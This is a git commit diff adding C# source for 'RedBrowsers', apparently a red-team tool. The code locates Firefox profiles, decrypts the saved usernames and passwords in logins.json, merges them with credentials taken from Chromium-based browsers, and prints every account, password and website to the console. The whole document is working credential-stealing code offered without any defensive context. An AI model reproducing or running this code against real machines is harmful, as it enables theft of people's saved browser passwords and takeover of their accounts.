a7da6bf8720094c1c61e6de192aca84463685c7b
0xAshraf <82064460+0xAshraf@users.noreply.github.com>
2021-04-07 03:49:55 +0200

    First Commit
    Added All Chormium Engines and Firfox

---
+++ RedBrowsers/RedBrowsers/Firefox/FirefoxPassReader.cs
@@ -0,0 +1,71 @@
+﻿using System.Web.Script.Serialization;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using RedBrowsers.Classes;
+namespace RedBrowsers.Firfox
+{
+    class FirefoxPassReader 
+    {
+
+        public static string BrowserName { get { return "Firefox"; } }
+        public  static List<Account> ReadPasswords()
+        { 
+            string loginsFile = null;
+            bool signonsFound = false;
+            bool loginsFound = false;
+            string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
+
+            var logins = new List<Account>();
+            if (dirs.Length == 0)
+                return logins;
+
+            foreach (string dir in dirs)
+            {
+                string[] files = Directory.GetFiles(dir, "logins.json");
+
+                if (files.Length > 0)
+                {
+                    loginsFile = files[0];
+                    loginsFound = true;
+                }
+
+                if (loginsFound || signonsFound)
+                {
+                    FFDecryptor.NSS_Init(dir);
+                    break;
+                }
+
+            }
+
+   
+            
+            if (loginsFound)
+            {
+                FFLogins ffLoginData;
+                using (StreamReader sr = new StreamReader(loginsFile))
+                {
+                    string json = sr.ReadToEnd();
+                 
+                    ffLoginData = new JavaScriptSerializer().Deserialize<FFLogins>(json);
+                }
+
+                foreach (LoginData loginData in ffLoginData.logins)
+                {
+                    string username = FFDecryptor.Decrypt(loginData.encryptedUsername);
+                    string password = FFDecryptor.Decrypt(loginData.encryptedPassword);
+                    logins.Add(new Account
+                    {
+                        UserName = username,
+                        Password = password,
+                        URL = loginData.hostname,
+                        Application = BrowserName
+                    }); ;
+                }
+            }
+            return logins;
+        }
+
+
+    }
+}
---
+++ RedBrowsers/RedBrowsers/Program.cs
@@ -0,0 +1,25 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using RedBrowsers.Classes;
+
+namespace RedBrowsers
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+             var a =   ChromiumEngine.GetChromium.Grab();
+             a.AddRange( Firfox.FirefoxPassReader.ReadPasswords());
+            foreach (Account account in a ) 
+            {
+                string output = $@"---------------------------------------------{Environment.NewLine}UserName    =  {account.UserName}{Environment.NewLine}PassWord    =  {account.Password}{Environment.NewLine}Website     =  {account.URL}{Environment.NewLine}Application =  {account.Application}{Environment.NewLine}---------------------------------------------";
+                Console.WriteLine(output);
+            }
+            Console.ReadLine();
+        }
+
+    }
+}
